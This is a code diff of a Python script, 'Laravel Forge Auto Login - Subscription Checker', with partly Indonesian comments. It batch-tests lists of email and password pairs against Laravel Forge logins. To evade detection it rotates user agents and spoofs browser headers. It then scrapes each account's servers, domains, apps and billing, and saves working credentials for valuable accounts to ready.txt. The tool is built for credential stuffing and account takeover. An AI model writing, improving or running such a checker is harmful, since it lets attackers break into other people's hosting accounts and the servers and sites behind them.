@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Laravel Forge Auto Login - Subscription Checker (Enhanced v2)
+Laravel Forge Auto Login - Subscription Checker (Enhanced v3)
 Automatically login to Laravel Forge and check subscription status
 Support untuk multiple credentials dari file dengan rotating user agent dan delay
 Auto-save ke ready.txt jika ada subscription + server + domain
@@ -16,6 +16,7 @@ from bs4 import BeautifulSoup
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 from datetime import datetime
+from urllib.parse import urljoin
 
 # User Agents untuk rotating
 USER_AGENTS = [
@@ -67,7 +68,12 @@ class ForgeChecker:
         # Set random user agent
         self.current_user_agent = self._get_random_user_agent()
         session.headers.update({
-            "User-Agent": self.current_user_agent
+            "User-Agent": self.current_user_agent,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1"
         })
         return session
     
@@ -166,10 +172,6 @@ class ForgeChecker:
             print(f"[*] Status Code: {response.status_code}")
             print(f"[*] URL setelah redirect: {response.url}")
             
-            # Debug: print response jika error
-            if response.status_code != 200:
-                print(f"[DEBUG] Response content (first 500 chars):\n{response.text[:500]}")
-            
             # Check if login was successful
             if response.status_code == 200:
                 if any(keyword in response.url.lower() for keyword in ["dashboard", "/servers", "/apps", "/providers"]):
@@ -195,7 +197,6 @@ class ForgeChecker:
             response2 = self.session.post(
                 f"{self.base_url}/sign-in",
                 data=form_payload,
-                headers={"X-Requested-With": "XMLHttpRequest"},
                 allow_redirects=True,
                 timeout=10
             )
@@ -227,154 +228,289 @@ class ForgeChecker:
         servers_data = []
         
         try:
+            print("[→] Trying API endpoint for servers...")
             # Try API endpoint first
             try:
-                api_response = self.session.get(f"{self.base_url}/api/servers", timeout=10)
+                api_response = self.session.get(
+                    f"{self.base_url}/api/servers",
+                    headers={"Accept": "application/json"},
+                    timeout=10
+                )
+                print(f"[*] API Response Status: {api_response.status_code}")
+                
                 if api_response.status_code == 200:
-                    api_data = api_response.json()
-                    if isinstance(api_data, dict) and 'data' in api_data:
-                        for server in api_data['data']:
-                            servers_data.append({
-                                "name": server.get('name', 'Unknown'),
-                                "provider": server.get('provider', ''),
-                                "region": server.get('region', ''),
-                                "ip": server.get('ip_address', ''),
-                                "size": server.get('size', ''),
-                                "os": server.get('os', ''),
-                                "php_version": server.get('php_version', ''),
-                                "type": "api"
-                            })
-                    elif isinstance(api_data, list):
-                        for server in api_data:
-                            servers_data.append({
-                                "name": server.get('name', 'Unknown'),
-                                "provider": server.get('provider', ''),
-                                "region": server.get('region', ''),
-                                "ip": server.get('ip_address', ''),
-                                "size": server.get('size', ''),
-                                "os": server.get('os', ''),
-                                "php_version": server.get('php_version', ''),
-                                "type": "api"
-                            })
-                print(f"[✓] Got {len(servers_data)} server(s) from API")
-            except:
-                pass
+                    try:
+                        api_data = api_response.json()
+                        print(f"[DEBUG] API Data: {json.dumps(api_data)[:200]}")
+                        
+                        if isinstance(api_data, dict) and 'data' in api_data:
+                            for server in api_data['data']:
+                                servers_data.append({
+                                    "name": server.get('name', 'Unknown'),
+                                    "provider": server.get('provider', ''),
+                                    "region": server.get('region', ''),
+                                    "ip": server.get('ip_address', ''),
+                                    "size": server.get('size', ''),
+                                    "os": server.get('os', ''),
+                                    "php_version": server.get('php_version', ''),
+                                    "type": "api"
+                                })
+                        elif isinstance(api_data, list):
+                            for server in api_data:
+                                servers_data.append({
+                                    "name": server.get('name', 'Unknown'),
+                                    "provider": server.get('provider', ''),
+                                    "region": server.get('region', ''),
+                                    "ip": server.get('ip_address', ''),
+                                    "size": server.get('size', ''),
+                                    "os": server.get('os', ''),
+                                    "php_version": server.get('php_version', ''),
+                                    "type": "api"
+                                })
+                        
+                        if servers_data:
+                            print(f"[✓] Got {len(servers_data)} server(s) from API")
+                    except json.JSONDecodeError:
+                        print("[!] API response bukan JSON, coba scraping...")
+            except Exception as e:
+                print(f"[!] API endpoint failed: {e}")
             
             # If no data from API, try web scraping
             if not servers_data:
+                print("[→] Trying web scraping for servers...")
                 response = self.session.get(f"{self.base_url}/servers", timeout=10)
+                print(f"[*] Scraping Response Status: {response.status_code}")
+                
                 if response.status_code == 200:
                     soup = BeautifulSoup(response.text, 'html.parser')
                     
-                    # Parse dari table atau cards
-                    server_cards = soup.find_all(['div', 'li'], class_=lambda x: x and ('server' in x.lower() or 'card' in x.lower()))
+                    # Debug: print page title
+                    title = soup.find('title')
+                    print(f"[*] Page Title: {title.get_text() if title else 'No title'}")
                     
-                    for card in server_cards:
-                        server_info = {}
-                        texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip()]
+                    # Cari semua text yang mungkin server names
+                    all_text = soup.get_text()
+                    print(f"[DEBUG] Page length: {len(all_text)} chars")
+                    
+                    # Method 1: Cari dari table
+                    print("[→] Looking for servers in tables...")
+                    tables = soup.find_all('table')
+                    print(f"[*] Found {len(tables)} table(s)")
+                    
+                    for table_idx, table in enumerate(tables):
+                        rows = table.find_all('tr')
+                        print(f"[*] Table {table_idx} has {len(rows)} rows")
+                        
+                        for row_idx, row in enumerate(rows[1:], 1):  # Skip header
+                            cells = row.find_all(['td', 'th'])
+                            if cells and len(cells) > 0:
+                                server_name = cells[0].get_text(strip=True)
+                                print(f"[*] Row {row_idx}: {server_name}")
+                                
+                                if server_name and len(server_name) > 1 and not any(x in server_name.lower() for x in ['server', 'name', 'provider']):
+                                    server_info = {
+                                        "name": server_name,
+                                        "type": "table"
+                                    }
+                                    
+                                    # Extract more info jika ada
+                                    if len(cells) > 1:
+                                        server_info["provider"] = cells[1].get_text(strip=True)
+                                    if len(cells) > 2:
+                                        server_info["region"] = cells[2].get_text(strip=True)
+                                    if len(cells) > 3:
+                                        server_info["ip"] = cells[3].get_text(strip=True)
+                                    
+                                    servers_data.append(server_info)
+                    
+                    # Method 2: Cari dari cards/divs
+                    print("[→] Looking for servers in cards...")
+                    server_cards = soup.find_all(['div', 'li'], class_=lambda x: x and ('server' in str(x).lower() or 'card' in str(x).lower()))
+                    print(f"[*] Found {len(server_cards)} card(s)")
+                    
+                    for card in server_cards[:10]:  # Limit to first 10
+                        texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip() and len(t.strip()) > 2]
                         if texts:
-                            server_info['name'] = texts[0]
-                            if len(texts) > 1:
-                                server_info['region'] = texts[1] if 'region' not in ' '.join(texts).lower() else ''
-                            server_info['type'] = 'scrape'
-                            servers_data.append(server_info)
+                            server_name = texts[0]
+                            print(f"[*] Card: {server_name}")
+                            
+                            if server_name and server_name not in [s.get('name') for s in servers_data]:
+                                servers_data.append({
+                                    "name": server_name,
+                                    "type": "card"
+                                })
             
-        except Exception as e:
-            print(f"[!] Error getting servers: {e}")
+            print(f"[✓] Total servers found: {len(servers_data)}")
+            return servers_data
         
-        return servers_data
+        except Exception as e:
+            print(f"[✗] Error getting servers: {e}")
+            import traceback
+            traceback.print_exc()
+            return servers_data
     
     def get_domains_data(self):
         """Get detailed domains data"""
         domains_data = []
         
         try:
+            print("[→] Trying API endpoint for domains...")
             # Try API endpoint first
             try:
-                api_response = self.session.get(f"{self.base_url}/api/domains", timeout=10)
+                api_response = self.session.get(
+                    f"{self.base_url}/api/domains",
+                    headers={"Accept": "application/json"},
+                    timeout=10
+                )
+                print(f"[*] API Response Status: {api_response.status_code}")
+                
                 if api_response.status_code == 200:
-                    api_data = api_response.json()
-                    if isinstance(api_data, dict) and 'data' in api_data:
-                        for domain in api_data['data']:
-                            domains_data.append({
-                                "domain": domain.get('domain', 'Unknown'),
-                                "server": domain.get('server', ''),
-                                "status": domain.get('status', ''),
-                                "ssl": domain.get('ssl', ''),
-                                "type": "api"
-                            })
-                    elif isinstance(api_data, list):
-                        for domain in api_data:
-                            domains_data.append({
-                                "domain": domain.get('domain', 'Unknown'),
-                                "server": domain.get('server', ''),
-                                "status": domain.get('status', ''),
-                                "ssl": domain.get('ssl', ''),
-                                "type": "api"
-                            })
-                print(f"[✓] Got {len(domains_data)} domain(s) from API")
-            except:
-                pass
+                    try:
+                        api_data = api_response.json()
+                        print(f"[DEBUG] API Data: {json.dumps(api_data)[:200]}")
+                        
+                        if isinstance(api_data, dict) and 'data' in api_data:
+                            for domain in api_data['data']:
+                                domains_data.append({
+                                    "domain": domain.get('domain', 'Unknown'),
+                                    "server": domain.get('server', ''),
+                                    "status": domain.get('status', ''),
+                                    "ssl": domain.get('ssl', ''),
+                                    "type": "api"
+                                })
+                        elif isinstance(api_data, list):
+                            for domain in api_data:
+                                domains_data.append({
+                                    "domain": domain.get('domain', 'Unknown'),
+                                    "server": domain.get('server', ''),
+                                    "status": domain.get('status', ''),
+                                    "ssl": domain.get('ssl', ''),
+                                    "type": "api"
+                                })
+                        
+                        if domains_data:
+                            print(f"[✓] Got {len(domains_data)} domain(s) from API")
+                    except json.JSONDecodeError:
+                        print("[!] API response bukan JSON, coba scraping...")
+            except Exception as e:
+                print(f"[!] API endpoint failed: {e}")
             
             # If no data from API, try web scraping
             if not domains_data:
+                print("[→] Trying web scraping for domains...")
                 response = self.session.get(f"{self.base_url}/domains", timeout=10)
+                print(f"[*] Scraping Response Status: {response.status_code}")
+                
                 if response.status_code == 200:
                     soup = BeautifulSoup(response.text, 'html.parser')
                     
-                    # Parse dari table atau cards
-                    domain_cards = soup.find_all(['div', 'li', 'tr'], class_=lambda x: x and ('domain' in (x or '').lower() or 'card' in (x or '').lower()))
+                    # Debug: print page title
+                    title = soup.find('title')
+                    print(f"[*] Page Title: {title.get_text() if title else 'No title'}")
                     
-                    for card in domain_cards:
-                        domain_info = {}
-                        texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip()]
-                        if texts and len(texts) > 0:
-                            domain_info['domain'] = texts[0]
-                            if len(texts) > 1:
-                                domain_info['server'] = texts[1]
-                            domain_info['type'] = 'scrape'
-                            domains_data.append(domain_info)
+                    # Method 1: Cari dari table
+                    print("[→] Looking for domains in tables...")
+                    tables = soup.find_all('table')
+                    print(f"[*] Found {len(tables)} table(s)")
+                    
+                    for table_idx, table in enumerate(tables):
+                        rows = table.find_all('tr')
+                        print(f"[*] Table {table_idx} has {len(rows)} rows")
+                        
+                        for row_idx, row in enumerate(rows[1:], 1):  # Skip header
+                            cells = row.find_all(['td', 'th'])
+                            if cells and len(cells) > 0:
+                                domain_name = cells[0].get_text(strip=True)
+                                print(f"[*] Row {row_idx}: {domain_name}")
+                                
+                                if domain_name and '.' in domain_name:  # Likely a domain
+                                    domain_info = {
+                                        "domain": domain_name,
+                                        "type": "table"
+                                    }
+                                    
+                                    if len(cells) > 1:
+                                        domain_info["server"] = cells[1].get_text(strip=True)
+                                    if len(cells) > 2:
+                                        domain_info["status"] = cells[2].get_text(strip=True)
+                                    
+                                    domains_data.append(domain_info)
+                    
+                    # Method 2: Cari dari cards/divs
+                    print("[→] Looking for domains in cards...")
+                    domain_cards = soup.find_all(['div', 'li'], class_=lambda x: x and ('domain' in str(x).lower() or 'card' in str(x).lower()))
+                    print(f"[*] Found {len(domain_cards)} card(s)")
+                    
+                    for card in domain_cards[:10]:  # Limit to first 10
+                        texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip() and len(t.strip()) > 2]
+                        if texts:
+                            domain_name = texts[0]
+                            print(f"[*] Card: {domain_name}")
+                            
+                            if domain_name and '.' in domain_name:
+                                if domain_name not in [d.get('domain') for d in domains_data]:
+                                    domains_data.append({
+                                        "domain": domain_name,
+                                        "type": "card"
+                                    })
             
-        except Exception as e:
-            print(f"[!] Error getting domains: {e}")
+            print(f"[✓] Total domains found: {len(domains_data)}")
+            return domains_data
         
-        return domains_data
+        except Exception as e:
+            print(f"[✗] Error getting domains: {e}")
+            import traceback
+            traceback.print_exc()
+            return domains_data
     
     def get_apps_data(self):
         """Get detailed apps data"""
         apps_data = []
         
         try:
+            print("[→] Trying API endpoint for apps...")
             # Try API endpoint
             try:
-                api_response = self.session.get(f"{self.base_url}/api/apps", timeout=10)
+                api_response = self.session.get(
+                    f"{self.base_url}/api/apps",
+                    headers={"Accept": "application/json"},
+                    timeout=10
+                )
+                print(f"[*] API Response Status: {api_response.status_code}")
+                
                 if api_response.status_code == 200:
-                    api_data = api_response.json()
-                    if isinstance(api_data, dict) and 'data' in api_data:
-                        for app in api_data['data']:
-                            apps_data.append({
-                                "name": app.get('name', 'Unknown'),
-                                "domain": app.get('domain', ''),
-                                "server": app.get('server', ''),
-                                "repository": app.get('repository', ''),
-                                "type": "api"
-                            })
-                    elif isinstance(api_data, list):
-                        for app in api_data:
-                            apps_data.append({
-                                "name": app.get('name', 'Unknown'),
-                                "domain": app.get('domain', ''),
-                                "server": app.get('server', ''),
-                                "repository": app.get('repository', ''),
-                                "type": "api"
-                            })
-                print(f"[✓] Got {len(apps_data)} app(s) from API")
-            except:
-                pass
+                    try:
+                        api_data = api_response.json()
+                        if isinstance(api_data, dict) and 'data' in api_data:
+                            for app in api_data['data']:
+                                apps_data.append({
+                                    "name": app.get('name', 'Unknown'),
+                                    "domain": app.get('domain', ''),
+                                    "server": app.get('server', ''),
+                                    "repository": app.get('repository', ''),
+                                    "type": "api"
+                                })
+                        elif isinstance(api_data, list):
+                            for app in api_data:
+                                apps_data.append({
+                                    "name": app.get('name', 'Unknown'),
+                                    "domain": app.get('domain', ''),
+                                    "server": app.get('server', ''),
+                                    "repository": app.get('repository', ''),
+                                    "type": "api"
+                                })
+                        
+                        if apps_data:
+                            print(f"[✓] Got {len(apps_data)} app(s) from API")
+                    except json.JSONDecodeError:
+                        print("[!] API response bukan JSON")
+            except Exception as e:
+                print(f"[!] API endpoint failed: {e}")
         
         except Exception as e:
             print(f"[!] Error getting apps: {e}")
         
+        print(f"[✓] Total apps found: {len(apps_data)}")
         return apps_data
     
     def get_subscription_data(self):
@@ -382,63 +518,87 @@ class ForgeChecker:
         subscription_data = {}
         
         try:
+            print("[→] Fetching subscription details...")
             response = self.session.get(f"{self.base_url}/account/billing", timeout=10)
+            print(f"[*] Response Status: {response.status_code}")
+            
             if response.status_code == 200:
                 soup = BeautifulSoup(response.text, 'html.parser')
                 
                 # Parse subscription info
                 all_text = soup.get_text()
+                print(f"[*] Page length: {len(all_text)} chars")
                 
                 # Cari subscription status
-                for elem in soup.find_all(['div', 'p', 'span', 'h1', 'h2', 'h3', 'li']):
+                subscription_found = False
+                for elem in soup.find_all(['div', 'p', 'span', 'h1', 'h2', 'h3', 'li', 'strong']):
                     text = elem.get_text(strip=True)
                     
-                    if 'subscription' in text.lower() and len(text) < 150:
+                    if 'subscription' in text.lower():
                         subscription_data['subscription_status'] = text
+                        subscription_found = True
+                        print(f"[*] Subscription text: {text[:100]}")
                     
                     if 'plan' in text.lower() and len(text) < 100:
                         subscription_data['plan'] = text
+                        print(f"[*] Plan: {text}")
                     
                     if 'active' in text.lower() and len(text) < 100:
                         subscription_data['status'] = text
+                        print(f"[*] Status: {text}")
                     
                     if any(plan in text.lower() for plan in ['pro', 'business', 'basic', 'starter']):
                         if len(text) < 100:
                             subscription_data['plan_type'] = text
+                            print(f"[*] Plan Type: {text}")
                 
                 # Try API endpoint
                 try:
-                    api_response = self.session.get(f"{self.base_url}/api/subscription", timeout=10)
+                    api_response = self.session.get(
+                        f"{self.base_url}/api/subscription",
+                        headers={"Accept": "application/json"},
+                        timeout=10
+                    )
                     if api_response.status_code == 200:
-                        api_data = api_response.json()
-                        subscription_data['api_subscription'] = api_data
+                        try:
+                            api_data = api_response.json()
+                            subscription_data['api_subscription'] = api_data
+                            subscription_found = True
+                            print(f"[*] API Subscription: {json.dumps(api_data)[:100]}")
+                        except:
+                            pass
                 except:
                     pass
                 
-                print("[✓] Subscription data retrieved")
+                if subscription_found:
+                    subscription_data['has_subscription'] = True
+                else:
+                    subscription_data['has_subscription'] = False
+                    print("[!] Tidak menemukan subscription data")
         
         except Exception as e:
             print(f"[!] Error getting subscription: {e}")
+            subscription_data['has_subscription'] = False
         
         return subscription_data
     
     def check_subscription(self):
         """Check subscription status after login"""
         try:
-            print("\n[→] Fetching complete subscription & server info...")
+            print("\n[→] Fetching complete subscription & server info...\n")
             
             # Get all data
-            print("[→] Fetching servers...")
             servers = self.get_servers_data()
+            print()
             
-            print("[→] Fetching domains...")
             domains = self.get_domains_data()
+            print()
             
-            print("[→] Fetching apps...")
             apps = self.get_apps_data()
+            print()
             
-            print("[→] Fetching subscription details...")
             subscription = self.get_subscription_data()
+            print()
             
             subscription_info = {
                 "logged_in": True,
@@ -451,8 +611,8 @@ class ForgeChecker:
                 "subscription": subscription
             }
             
-            print(f"[✓] Found {len(servers)} server(s), {len(domains)} domain(s), {len(apps)} app(s)")
-            print("[✓] Complete data fetch completed")
+            print(f"[✓] Summary - Servers: {len(servers)}, Domains: {len(domains)}, Apps: {len(apps)}")
+            print("[✓] Complete data fetch completed\n")
             return subscription_info
             
         except Exception as e:
@@ -489,7 +649,8 @@ def save_to_ready_file(email, password, data, output_file="ready.txt"):
     # Check if has subscription, server, and domain
     has_subscription = (
         data.get('subscription') and 
-        data['subscription'].get('subscription')
+        data['subscription'].get('subscription') and
+        data['subscription']['subscription'].get('has_subscription')
     )
     has_servers = (
         data.get('subscription') and 
@@ -500,6 +661,11 @@ def save_to_ready_file(email, password, data, output_file="ready.txt"):
         data['subscription'].get('total_domains', 0) > 0
     )
     
+    print(f"\n[DEBUG] Checking save conditions:")
+    print(f"  - has_subscription: {has_subscription}")
+    print(f"  - has_servers: {has_servers}")
+    print(f"  - has_domains: {has_domains}")
+    
     if has_subscription and has_servers and has_domains:
         with file_lock:
             try:
@@ -509,6 +675,7 @@ def save_to_ready_file(email, password, data, output_file="ready.txt"):
                     "password": password,
                     "servers": data['subscription'].get('total_servers', 0),
                     "domains": data['subscription'].get('total_domains', 0),
+                    "apps": data['subscription'].get('total_apps', 0),
                     "timestamp": datetime.now().isoformat()
                 }
                 
@@ -516,12 +683,21 @@ def save_to_ready_file(email, password, data, output_file="ready.txt"):
                 with open(output_file, 'a') as f:
                     f.write(json.dumps(save_data) + '\n')
                 
-                print(f"\n[💾] SAVED TO {output_file}: {email}")
-                print(f"     Servers: {save_data['servers']}, Domains: {save_data['domains']}")
+                print(f"\n[💾] ✅ SAVED TO {output_file}: {email}")
+                print(f"     Servers: {save_data['servers']}, Domains: {save_data['domains']}, Apps: {save_data['apps']}")
                 return True
             except Exception as e:
                 print(f"[✗] Error saving to file: {e}")
                 return False
+    else:
+        print(f"[✗] Not saved - Missing: ", end="")
+        if not has_subscription:
+            print("subscription ", end="")
+        if not has_servers:
+            print("servers ", end="")
+        if not has_domains:
+            print("domains ", end="")
+        print()
     
     return False
 
@@ -587,7 +763,7 @@ def save_results_to_file(results, output_file="forge_results.json"):
 def main():
     """Main function"""
     print("\n" + "=" * 70)
-    print("Laravel Forge Login Checker - Batch Mode (Enhanced v2)")
+    print("Laravel Forge Login Checker - Batch Mode (Enhanced v3 - Debug)")
     print("=" * 70 + "\n")
     
     while True:
@@ -648,8 +824,14 @@ def main():
                 results.append(result)
                 
                 print("\n" + "-" * 70)
-                print("HASIL:")
-                print(json.dumps(result, indent=2, ensure_ascii=False)[:500])
+                print("RESULT SUMMARY:")
+                print(f"Status: {result['status']}")
+                if result['status'] == 'success':
+                    print(f"Servers: {result['subscription']['total_servers']}")
+                    print(f"Domains: {result['subscription']['total_domains']}")
+                    print(f"Apps: {result['subscription']['total_apps']}")
+                else:
+                    print(f"Message: {result.get('message', 'Unknown error')}")
                 print("-" * 70)
                 
                 # Auto-save to ready.txt if has subscription, servers, and domains
@@ -674,10 +856,11 @@ def main():
                 "success": len([r for r in results if r['status'] == 'success']),
                 "failed": len([r for r in results if r['status'] == 'failed']),
                 "checked_at": datetime.now().isoformat(),
-                "results": results
             }
             
-            print(json.dumps(summary, indent=2, ensure_ascii=False)[:1000])
+            print(f"Total: {summary['total_accounts']}")
+            print(f"Success: {summary['success']}")
+            print(f"Failed: {summary['failed']}")
             
             save_option = input("\n💾 Simpan hasil detail? (y/n): ").strip().lower()
             if save_option == 'y':
@@ -710,8 +893,14 @@ def main():
                 )
                 
                 print("\n" + "=" * 70)
-                print("HASIL:")
-                print(json.dumps(result, indent=2, ensure_ascii=False)[:1000])
+                print("RESULT SUMMARY:")
+                print(f"Status: {result['status']}")
+                if result['status'] == 'success':
+                    print(f"Servers: {result['subscription']['total_servers']}")
+                    print(f"Domains: {result['subscription']['total_domains']}")
+                    print(f"Apps: {result['subscription']['total_apps']}")
+                else:
+                    print(f"Message: {result.get('message', 'Unknown error')}")
                 print("=" * 70 + "\n")
                 
                 # Auto-save to ready.txt if valid
